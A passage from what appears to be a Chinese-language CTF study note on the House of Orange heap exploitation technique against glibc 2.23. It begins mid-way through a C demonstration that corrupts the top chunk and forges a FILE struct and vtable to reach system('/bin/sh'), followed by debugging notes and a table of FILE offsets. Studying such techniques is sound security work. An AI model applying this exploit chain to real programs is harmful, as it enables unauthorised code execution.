      _IO_list_all and calling _IO_OVERFLOW on them.

      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */

    io_list_all = top[2] + 0x9a8;

    /*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.

      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be _IO_list_all - 16
    */
 
    top[3] = io_list_all - 0x10;

    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      Since we overflow the old top chunk, we also control it's size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;

    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      We want to satisfy the first condition:
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    FILE *fp = (FILE *) top;


    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8


    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
}
```

相关机制：

在 `malloc` 过程中，当从 Unsorted Bin 中获取一个块时，会调用 `unlink`

### ptmalloc机制

![image-20261125190132468](/pwn-notes/images/notes/image-20261125190132468.png)



单链表（lifo）：后进先出

![image-20261125105056244](/pwn-notes/images/notes/image-20261125105056244.png)

调试：“

```bash
sudo sysctl -w kernel.yama.ptrace_scope=0
```

调试的时候加上-g参数，然后调试的时候就会看到代码

首先申请一个堆块

![image-20261125150114614](/pwn-notes/images/notes/image-20261125150114614.png)

![image-20261125150302006](/pwn-notes/images/notes/image-20261125150302006.png)

下面就是此时的top_chunk的大小

![image-20261125151005869](/pwn-notes/images/notes/image-20261125151005869.png)

那个top就是指向这个的地方

![image-20261125151328166](/pwn-notes/images/notes/image-20261125151328166.png)

![image-20261125151133061](/pwn-notes/images/notes/image-20261125151133061.png)

这个就是top1

之后的话就是直接修改其大小

（不能直接从top里面切，而是需要调用sysmalloc ）

```c
assert ((old_top == initial_top(av) && old_size == 0) ||
        (old_size >= MINSIZE && prev_inuse(old_top) &&
         ((unsigned long)old_end & (pagesize - 1)) == 0));
```

![image-20261125190857619](/pwn-notes/images/notes/image-20261125190857619.png)

这个时候以经将那个top_chunk的size字段改成了c01

![image-20261125191041827](/pwn-notes/images/notes/image-20261125191041827.png)

申请x01000

效果：

![image-20261125191120391](/pwn-notes/images/notes/image-20261125191120391.png)

这是在泄露libc地址吗，这里其实是申请了0x1000

![image-20261125195731200](/pwn-notes/images/notes/image-20261125195731200.png)

之后的top[3]就是bk指针

![image-20261125195959512](/pwn-notes/images/notes/image-20261125195959512.png)

![image-20261125200121599](/pwn-notes/images/notes/image-20261125200121599.png)

之后的话，将相关字符串写入top的开头

![image-20261125201742610](/pwn-notes/images/notes/image-20261125201742610.png)

之后又修改了topchunk的size大小

![image-20261125201814947](/pwn-notes/images/notes/image-20261125201814947.png)

![image-20261125201847173](/pwn-notes/images/notes/image-20261125201847173.png)

之后

![image-20261125203126677](/pwn-notes/images/notes/image-20261125203126677.png)

![image-20261125203115043](/pwn-notes/images/notes/image-20261125203115043.png)

![image-20261125203733845](/pwn-notes/images/notes/image-20261125203733845.png)

![image-20261126000422824](/pwn-notes/images/notes/image-20261126000422824.png)

![image-20261126000444189](/pwn-notes/images/notes/image-20261126000444189.png)

也就是说这三个参数的设置就只是为了通过这个if检查，之后的话好进入_IO_OVERFLOW





看懵了

### FILE结构体

| 字段             | 偏移 |
| :--------------- | :--- |
| `_flags`         | 0x00 |
| `_IO_read_ptr`   | 0x08 |
| `_IO_write_base` | 0x20 |
| `_IO_write_ptr`  | 0x28 |
| `_chain`         | 0x68 |
| `_mode`          | 0xc0 |
| `vtable`         | 0xd8 |

![image-20261126000826368](/pwn-notes/images/notes/image-20261126000826368.png)

青色三行——决定成立后干什么。 _IO_OVERFLOW(fp, EOF) 实际是调用 fp->vtable->__overflow(fp, EOF)。2.23 不检查 vtable 指针，所以我们在堆上造一张假表，把 __overflow 那个槽填成 system。而第一个参数传的就是 fp 本身——所以把 "/bin/sh" 放在伪造 FILE 的开头，system(fp) 就变成了 system("/bin/sh")。_chain 则是让 _IO_list_all 那条链表能走到我们这块。

### malloc_printerr

![image-20261126001351918](/pwn-notes/images/notes/image-20261126001351918.png)

2.26 那个提交把这条链路拆掉了，`malloc_printerr` 不再触发 `_IO_flush_all_lockp`

![image-20261126001548885](/pwn-notes/images/notes/image-20261126001548885.png)

<!-- sync-hash: 7e14e383a71d8d1529e982ec1874a476d1a417a3888b4973b2e3b697cc892d95 -->
